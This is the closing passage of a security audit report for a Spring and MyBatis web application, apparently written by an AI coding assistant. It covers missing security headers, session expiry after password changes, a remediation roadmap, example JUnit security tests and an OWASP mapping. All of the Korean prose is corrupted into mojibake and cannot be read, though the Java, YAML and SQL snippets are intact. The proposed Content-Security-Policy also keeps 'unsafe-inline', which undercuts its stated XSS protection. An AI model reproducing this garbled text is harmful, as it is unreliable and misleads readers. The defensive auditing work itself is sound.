MyBatis ë§¤ê°œë³€ìˆ˜í™” ì¿¼ë¦¬ë¥¼ ê³„ì† ì‚¬ìš©. ë” ë‚˜ì€ ì„±ëŠ¥ì„ ìœ„í•´ ì „ì²´ í…ìŠ¤íŠ¸ ê²€ìƒ‰ ê³ ë ¤:
```sql
-- ì „ì²´ í…ìŠ¤íŠ¸ ì¸ë±ìŠ¤ ì¶”ê°€
ALTER TABLE posts ADD FULLTEXT INDEX ft_title_content (title, content);

-- LIKE ëŒ€ì‹  MATCH AGAINST ì‚¬ìš©
SELECT * FROM posts WHERE MATCH(title, content) AGAINST(#{searchQuery} IN NATURAL LANGUAGE MODE);
```

---

#### 13. ë³´ì•ˆ í—¤ë” ëˆ„ë½
**ìœ„ì¹˜**: ë³´ì•ˆ í—¤ë” êµ¬ì„± ì—†ìŒ
**CWE**: CWE-1021 (ë Œë”ë§ëœ UI ë ˆì´ì–´ì˜ ë¶€ì ì ˆí•œ ì œí•œ)
**OWASP**: A05:2021 â€“ ë³´ì•ˆ êµ¬ì„± ì˜¤ë¥˜

**ë¬¸ì œì **:
ë³´ì•ˆ í—¤ë”ê°€ êµ¬ì„±ë˜ì§€ ì•ŠìŒ:
- `X-Frame-Options` ì—†ìŒ â†’ í´ë¦­ì¬í‚¹ ê³µê²©
- `X-Content-Type-Options` ì—†ìŒ â†’ MIME ìŠ¤ë‹ˆí•‘ ê³µê²©
- `Content-Security-Policy` ì—†ìŒ â†’ XSS ì™„í™” ê³µë°±

**í•´ê²° ë°©ë²•**:
```java
@Configuration
public class SecurityHeadersConfig {
    @Bean
    public FilterRegistrationBean<SecurityHeadersFilter> securityHeadersFilter() {
        FilterRegistrationBean<SecurityHeadersFilter> registration = new FilterRegistrationBean<>();
        registration.setFilter(new SecurityHeadersFilter());
        registration.addUrlPatterns("/*");
        return registration;
    }
}

public class SecurityHeadersFilter implements Filter {
    @Override
    public void doFilter(ServletRequest request, ServletResponse response, FilterChain chain)
            throws IOException, ServletException {
        HttpServletResponse httpResponse = (HttpServletResponse) response;

        httpResponse.setHeader("X-Frame-Options", "DENY");
        httpResponse.setHeader("X-Content-Type-Options", "nosniff");
        httpResponse.setHeader("X-XSS-Protection", "1; mode=block");
        httpResponse.setHeader("Content-Security-Policy",
            "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'");
        httpResponse.setHeader("Referrer-Policy", "strict-origin-when-cross-origin");

        chain.doFilter(request, response);
    }
}
```

---

#### 14. ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ì´ ê¸°ì¡´ ì„¸ì…˜ì„ ë¬´íš¨í™”í•˜ì§€ ì•ŠìŒ
**ìœ„ì¹˜**: `UserController.java:89-106`, `UserService.java:54-74`
**CWE**: CWE-613 (ë¶ˆì¶©ë¶„í•œ ì„¸ì…˜ ë§Œë£Œ)
**OWASP**: A07:2021 â€“ ì‹ë³„ ë° ì¸ì¦ ì‹¤íŒ¨

**ë¬¸ì œì **:
ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ í›„ ê¸°ì¡´ ì„¸ì…˜ì´ í™œì„± ìƒíƒœë¡œ ìœ ì§€ë¨:

```java
// UserController.java:97
userService.changePassword(userId, request);
// ì„¸ì…˜ì´ ë¬´íš¨í™”ë˜ì§€ ì•ŠìŒ â†’ ë¹„ë°€ë²ˆí˜¸ ì¬ì„¤ì • í›„ì—ë„ ê³µê²©ìê°€ ì ‘ê·¼ ìœ ì§€
```

**ê³µê²© ì‹œë‚˜ë¦¬ì˜¤**:
1. ê³µê²©ìê°€ ì‚¬ìš©ìì˜ ì„¸ì…˜ ì¿ í‚¤ íƒˆì·¨
2. ì‚¬ìš©ìê°€ ì¹¨í•´ë¥¼ ì¸ì§€í•˜ê³  ë¹„ë°€ë²ˆí˜¸ ë³€ê²½
3. ê³µê²©ìì˜ íƒˆì·¨ëœ ì„¸ì…˜ì´ ì—¬ì „íˆ ì‘ë™ â†’ ê³„ì†ëœ ë¬´ë‹¨ ì ‘ê·¼

**í•´ê²° ë°©ë²•**:
```java
@PostMapping("/change-password")
public ResponseEntity<?> changePassword(@RequestBody ChangePasswordRequest request,
                                       HttpSession session,
                                       HttpServletRequest httpRequest) {
    String userId = (String) session.getAttribute("userId");
    if (userId == null) return ResponseEntity.status(401).build();

    userService.changePassword(userId, request);

    // ì´ ì‚¬ìš©ìì˜ ëª¨ë“  ì„¸ì…˜ ë¬´íš¨í™”
    sessionRegistry.getAllPrincipals().stream()
        .filter(principal -> principal.equals(userId))
        .forEach(principal ->
            sessionRegistry.getAllSessions(principal, false)
                .forEach(SessionInformation::expireNow)
        );

    // ìƒˆ ì„¸ì…˜ ìƒì„±
    session.invalidate();
    HttpSession newSession = httpRequest.getSession(true);
    newSession.setAttribute("userId", userId);

    return ResponseEntity.ok(Map.of("message", "ë¹„ë°€ë²ˆí˜¸ê°€ ë³€ê²½ë˜ì—ˆìŠµë‹ˆë‹¤. ë‹¤ì‹œ ë¡œê·¸ì¸í•˜ì„¸ìš”."));
}
```

---

### ğŸŸ¢ ë‚®ì€ ì‹¬ê°ë„ (ê´€ì°°ì‚¬í•­)

#### 15. ì½˜ì†” ë¡œê¹…ì— ë¯¼ê°í•œ ì‘ì—… í¬í•¨
**ìœ„ì¹˜**: `PostController.java:65-69`, `FileController.java:49-55`
**ë¬¸ì œì **: ê³¼ë„í•œ ë¡œê¹…ì´ í”„ë¡œë•ì…˜ ë¡œê·¸ì— ë¯¼ê°í•œ ë°ì´í„°ë¥¼ ìœ ì¶œí•  ìˆ˜ ìˆìŒ.
**ê¶Œì¥ ì‚¬í•­**: ì ì ˆí•œ ë¡œê¹… í”„ë ˆì„ì›Œí¬(SLF4J)ë¥¼ ë¡œê·¸ ìˆ˜ì¤€ê³¼ í•¨ê»˜ ì‚¬ìš©, í”„ë¡œë•ì…˜ì—ì„œ DEBUG ë¹„í™œì„±í™”.

#### 16. í”„ë¡ íŠ¸ì—”ë“œ XSS ë³´í˜¸ ì¡´ì¬ (DOMPurify)
**ìœ„ì¹˜**: `PostDetail.js:303`
**ìƒíƒœ**: âœ… **ëª¨ë²” ì‚¬ë¡€**
ë Œë”ë§ ì „ DOMPurifyë¡œ ì‚¬ìš©ì ìƒì„± HTML ì½˜í…ì¸ ë¥¼ ì ì ˆíˆ ì •ì œ.

---

## ì·¨ì•½ì  ìš”ì•½

| ì‹¬ê°ë„ | ê°œìˆ˜ | ë¬¸ì œì  |
|--------|------|--------|
| ğŸ”´ ì¹˜ëª…ì  | 4 | CSRF, ì•ˆì „í•˜ì§€ ì•Šì€ ì¿ í‚¤, ì•½í•œ ë¹„ë°€ë²ˆí˜¸ í•´ì‹±, íŒŒì¼ ê¶Œí•œ ë¶€ì¡± |
| ğŸŸ  ë†’ìŒ | 5 | í•˜ë“œì½”ë”©ëœ ìê²© ì¦ëª…, CORS ì„¤ì • ì˜¤ë¥˜, ê²½ë¡œ ìˆœíšŒ, ì •ë³´ ìœ ì¶œ, ì†ë„ ì œí•œ ì—†ìŒ |
| ğŸŸ¡ ì¤‘ê°„ | 5 | ì…ë ¥ ê²€ì¦, ì•ˆì „í•˜ì§€ ì•Šì€ íŒŒì¼ ì €ì¥ì†Œ, SQL ì£¼ì… ìœ„í—˜, ë³´ì•ˆ í—¤ë”, ì„¸ì…˜ ê´€ë¦¬ |
| ğŸŸ¢ ë‚®ìŒ | 2 | ë¡œê¹…, XSS ë³´í˜¸ (ì–‘í˜¸) |

---

## ê°œì„  ë¡œë“œë§µ

### 1ë‹¨ê³„: ì¦‰ì‹œ ì¡°ì¹˜ (1-2ì£¼)
**ìš°ì„ ìˆœìœ„**: ì¹˜ëª…ì  ë° ë†’ìŒ ì‹¬ê°ë„ ë¬¸ì œ

1. **Spring Security í”„ë ˆì„ì›Œí¬ ì¶”ê°€** (í•´ê²°: CSRF, ì„¸ì…˜ ë³´ì•ˆ, ê¶Œí•œ ë¶€ì—¬)
   ```xml
   <dependency>
       <groupId>org.springframework.boot</groupId>
       <artifactId>spring-boot-starter-security</artifactId>
   </dependency>
   ```

2. **CSRF ë³´í˜¸ êµ¬í˜„**
   - Spring Security CSRF í† í° í™œì„±í™”
   - í”„ë¡ íŠ¸ì—”ë“œì—ì„œ ìš”ì²­ì— CSRF í† í° í¬í•¨í•˜ë„ë¡ ì—…ë°ì´íŠ¸

3. **ë³´ì•ˆ ì„¸ì…˜ ì¿ í‚¤ êµ¬ì„±**
   ```yaml
   server:
     servlet:
       session:
         cookie:
           http-only: true
           secure: true
           same-site: strict
   ```

4. **ë¹„ë°€ë²ˆí˜¸ í•´ì‹±ì„ BCryptë¡œ êµì²´**
   - SHA-256ì—ì„œ BCryptPasswordEncoderë¡œ ë§ˆì´ê·¸ë ˆì´ì…˜
   - ê¸°ì¡´ ì‚¬ìš©ìë¥¼ ìœ„í•œ í•´ì‹œ ë§ˆì´ê·¸ë ˆì´ì…˜ ì „ëµ

5. **íŒŒì¼ ë‹¤ìš´ë¡œë“œ ê¶Œí•œ ë¶€ì—¬ ì¶”ê°€**
   - íŒŒì¼ ë‹¤ìš´ë¡œë“œë¥¼ í—ˆìš©í•˜ê¸° ì „ì— ì‚¬ìš©ìê°€ ê²Œì‹œë¬¼ ì†Œìœ ìì¸ì§€ í™•ì¸
   - ì¼ë°˜ íŒŒì¼ ë° ì—‘ì…€ íŒŒì¼ ëª¨ë‘ì— ì ìš©

6. **ë°ì´í„°ë² ì´ìŠ¤ ìê²© ì¦ëª…ì„ í™˜ê²½ ë³€ìˆ˜ë¡œ ì´ë™**
   ```yaml
   spring:
     datasource:
       password: ${DB_PASSWORD}
   ```

### 2ë‹¨ê³„: ë†’ì€ ìš°ì„ ìˆœìœ„ (2-4ì£¼)

7. **CORS êµ¬ì„± ìˆ˜ì •**
   - í™˜ê²½ ê¸°ë°˜ êµ¬ì„±ìœ¼ë¡œ ì´ë™
   - í•˜ë“œì½”ë”©ëœ origin ì œê±°

8. **ê²½ë¡œ ìˆœíšŒ ë³´í˜¸ êµ¬í˜„**
   - íŒŒì¼ ì´ë¦„ ì •ì œ
   - í•´ì„ëœ ê²½ë¡œ ê²€ì¦

9. **ì „ì—­ ì˜ˆì™¸ í•¸ë“¤ëŸ¬ ì¶”ê°€**
   - ì‚¬ìš©ìì—ê²Œ ì¼ë°˜ì ì¸ ì˜¤ë¥˜ ë©”ì‹œì§€
   - ê°œë°œìë¥¼ ìœ„í•œ ìƒì„¸ ë¡œê¹…

10. **ì†ë„ ì œí•œ êµ¬í˜„**
    - ë¡œê·¸ì¸ ì—”ë“œí¬ì¸íŠ¸: ë¶„ë‹¹ 5íšŒ ì‹œë„
    - íšŒì›ê°€ì… ì—”ë“œí¬ì¸íŠ¸: ì‹œê°„ë‹¹ 3íšŒ ì‹œë„
    - ë¹„ë°€ë²ˆí˜¸ ë³€ê²½: ì‹œê°„ë‹¹ 3íšŒ ì‹œë„

### 3ë‹¨ê³„: ì¤‘ê°„ ìš°ì„ ìˆœìœ„ (4-6ì£¼)

11. **ì…ë ¥ ê²€ì¦ ì¶”ê°€**
    - DTOì— Bean Validation ì–´ë…¸í…Œì´ì…˜
    - ë¹„ì¦ˆë‹ˆìŠ¤ ê·œì¹™ì„ ìœ„í•œ ì‚¬ìš©ì ì •ì˜ ê²€ì¦ê¸°

12. **íŒŒì¼ ì €ì¥ì†Œ ê°œì„ **
    - ì™¸ë¶€ ì €ì¥ ë””ë ‰í† ë¦¬
    - ì‚¬ìš©ì ê¸°ë°˜ êµ¬ì„±
    - ì €ì¥ ì‹œ ì•”í˜¸í™” ê³ ë ¤

13. **ë³´ì•ˆ í—¤ë” í•„í„° ì¶”ê°€**
    - X-Frame-Options, CSP, X-Content-Type-Options
    - Spring Securityë¥¼ í†µí•´ êµ¬ì„±

14. **ì„¸ì…˜ ê´€ë¦¬ ê°œì„ **
    - ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì‹œ ì„¸ì…˜ ë¬´íš¨í™”
    - ë™ì‹œ ì„¸ì…˜ ì œì–´ êµ¬í˜„

15. **SQL ë³´ì•ˆ ê°•í™”**
    - ëª¨ë“  MyBatis ì¿¼ë¦¬ì— ëŒ€í•œ ì½”ë“œ ë¦¬ë·°
    - ì„±ëŠ¥ì„ ìœ„í•œ ì „ì²´ í…ìŠ¤íŠ¸ ê²€ìƒ‰ ê³ ë ¤

### 4ë‹¨ê³„: ì§€ì†ì  ê°œì„ 

16. **ë³´ì•ˆ ëª¨ë‹ˆí„°ë§**
    - ë³´ì•ˆ ë¡œê¹… ë° ê²½ê³  ì¶”ê°€
    - ì‹¤íŒ¨í•œ ë¡œê·¸ì¸ ì‹œë„ ëª¨ë‹ˆí„°ë§
    - íŒŒì¼ ì ‘ê·¼ íŒ¨í„´ ì¶”ì 

17. **ì •ê¸° ë³´ì•ˆ í…ŒìŠ¤íŠ¸**
    - ìë™í™”ëœ ë³´ì•ˆ ìŠ¤ìº” (OWASP ZAP, SonarQube)
    - í”„ë¡œë•ì…˜ ì „ ì¹¨íˆ¬ í…ŒìŠ¤íŠ¸
    - ì˜ì¡´ì„± ì·¨ì•½ì  ìŠ¤ìº”

18. **ë¬¸ì„œí™”**
    - ë³´ì•ˆ ì•„í‚¤í…ì²˜ ë¬¸ì„œí™”
    - ì‚¬ê³  ëŒ€ì‘ ì ˆì°¨
    - ìƒˆ ê¸°ëŠ¥ì— ëŒ€í•œ ë³´ì•ˆ ê²€í†  ì²´í¬ë¦¬ìŠ¤íŠ¸

---

## í…ŒìŠ¤íŠ¸ ê¶Œì¥ì‚¬í•­

### ë³´ì•ˆ í…ŒìŠ¤íŠ¸ ì¼€ì´ìŠ¤

```java
// ì˜ˆì œ: CSRF ë³´í˜¸ í…ŒìŠ¤íŠ¸
@Test
void shouldRejectRequestWithoutCSRFToken() {
    mockMvc.perform(post("/api/posts")
            .contentType(MediaType.APPLICATION_JSON)
            .content("{\"title\":\"Test\",\"content\":\"Test\"}"))
        .andExpect(status().isForbidden());
}

// ì˜ˆì œ: ê¶Œí•œ ë¶€ì—¬ í…ŒìŠ¤íŠ¸
@Test
void shouldDenyFileDownloadForNonOwner() {
    // ì‚¬ìš©ì Aê°€ íŒŒì¼ ì—…ë¡œë“œ
    Long fileId = uploadFileAsUser("userA", "test.txt");

    // ì‚¬ìš©ì Bê°€ ë‹¤ìš´ë¡œë“œ ì‹œë„
    mockMvc.perform(get("/api/files/download/" + fileId)
            .sessionAttr("userId", "userB"))
        .andExpect(status().isForbidden());
}

// ì˜ˆì œ: ì†ë„ ì œí•œ í…ŒìŠ¤íŠ¸
@Test
void shouldBlockExcessiveLoginAttempts() {
    for (int i = 0; i < 6; i++) {
        mockMvc.perform(post("/api/users/login")
                .contentType(MediaType.APPLICATION_JSON)
                .content("{\"userId\":\"admin\",\"password\":\"wrong\"}"));
    }

    // 6ë²ˆì§¸ ì‹œë„ëŠ” ì†ë„ ì œí•œë˜ì–´ì•¼ í•¨
    mockMvc.perform(post("/api/users/login")
            .contentType(MediaType.APPLICATION_JSON)
            .content("{\"userId\":\"admin\",\"password\":\"wrong\"}"))
        .andExpect(status().isTooManyRequests());
}
```

---

## ê·œì • ì¤€ìˆ˜ ê³ ë ¤ì‚¬í•­

### OWASP Top 10 2021 ë²”ìœ„

| OWASP ë²”ì£¼ | ë°œê²¬ì‚¬í•­ | ìƒíƒœ |
|------------|---------|------|
| A01: ê¹¨ì§„ ì ‘ê·¼ ì œì–´ | CSRF, íŒŒì¼ ê¶Œí•œ ë¶€ì—¬, CORS | âŒ ë¯¸ì¤€ìˆ˜ |
| A02: ì•”í˜¸í™” ì‹¤íŒ¨ | ì•½í•œ ë¹„ë°€ë²ˆí˜¸ í•´ì‹±, í•˜ë“œì½”ë”©ëœ ìê²© ì¦ëª… | âŒ ë¯¸ì¤€ìˆ˜ |
| A03: ì£¼ì… | SQL ì£¼ì… (ì™„í™”ë¨), ê²½ë¡œ ìˆœíšŒ | âš ï¸ ë¶€ë¶„ ì¤€ìˆ˜ |
| A04: ì•ˆì „í•˜ì§€ ì•Šì€ ì„¤ê³„ | ì •ë³´ ìœ ì¶œ, ì†ë„ ì œí•œ ì—†ìŒ | âŒ ë¯¸ì¤€ìˆ˜ |
| A05: ë³´ì•ˆ êµ¬ì„± ì˜¤ë¥˜ | ì„¸ì…˜ ì¿ í‚¤, ë³´ì•ˆ í—¤ë”, CORS | âŒ ë¯¸ì¤€ìˆ˜ |
| A07: ì‹ë³„ ë° ì¸ì¦ ì‹¤íŒ¨ | ë¹„ë°€ë²ˆí˜¸ ë³€ê²½ ì„¸ì…˜, ì†ë„ ì œí•œ | âŒ ë¯¸ì¤€ìˆ˜ |

**í˜„ì¬ ì¤€ìˆ˜ ì ìˆ˜**: 15% (10ê°œ ë²”ì£¼ ì¤‘ 1.5ê°œ ì™„ì „íˆ í•´ê²°ë¨)
**ëª©í‘œ ì ìˆ˜**: 90%+ (10ê°œ ì¤‘ 9ê°œ ë²”ì£¼)

---

## ê²°ë¡ 

ì• í”Œë¦¬ì¼€ì´ì…˜ì€ í”„ë¡œë•ì…˜ ë°°í¬ ì „ì— í•´ê²°í•´ì•¼ í•˜ëŠ” **ê·¼ë³¸ì ì¸ ë³´ì•ˆ ê³µë°±**ì´ ìˆìŠµë‹ˆë‹¤. Spring Security í”„ë ˆì„ì›Œí¬, CSRF ë³´í˜¸ ë° ì ì ˆí•œ ê¶Œí•œ ê²€ì‚¬ì˜ ë¶€ì¡±ì€ ìƒë‹¹í•œ ìœ„í—˜ ë…¸ì¶œì„ ë§Œë“­ë‹ˆë‹¤.

**ê¶Œì¥ ì¡°ì¹˜**:
1. **ì¦‰ì‹œ**: ì¹˜ëª…ì  ë¬¸ì œê°€ í•´ê²°ë  ë•Œê¹Œì§€ í”„ë¡œë•ì…˜ ë°°í¬ ì°¨ë‹¨
2. **ë‹¨ê¸°**: Spring Security í”„ë ˆì„ì›Œí¬ êµ¬í˜„ ë° ë†’ìŒ ì‹¬ê°ë„ ë¬¸ì œ í•´ê²°
3. **ì¥ê¸°**: ë³´ì•ˆ ìš°ì„  ê°œë°œ ê´€í–‰ ë° ì§€ì†ì ì¸ ëª¨ë‹ˆí„°ë§ êµ¬ì¶•

**ì˜ˆìƒ ë…¸ë ¥**:
- 1ë‹¨ê³„ (ì¹˜ëª…ì ): ê°œë°œì 2ì£¼
- 2ë‹¨ê³„ (ë†’ìŒ): ê°œë°œì 2ì£¼
- 3ë‹¨ê³„ (ì¤‘ê°„): ê°œë°œì 3ì£¼
- **ì´ê³„**: í¬ê´„ì ì¸ ë³´ì•ˆ ê°•í™”ë¥¼ ìœ„í•´ ê°œë°œì ~7ì£¼

---

**í‰ê°€ ì™„ë£Œì**: Claude Code ë³´ì•ˆ í˜ë¥´ì†Œë‚˜
**ê²€í†  ë‚ ì§œ**: 2025-11-08
**ë‹¤ìŒ ê²€í† **: 1ë‹¨ê³„ ì™„ë£Œ í›„
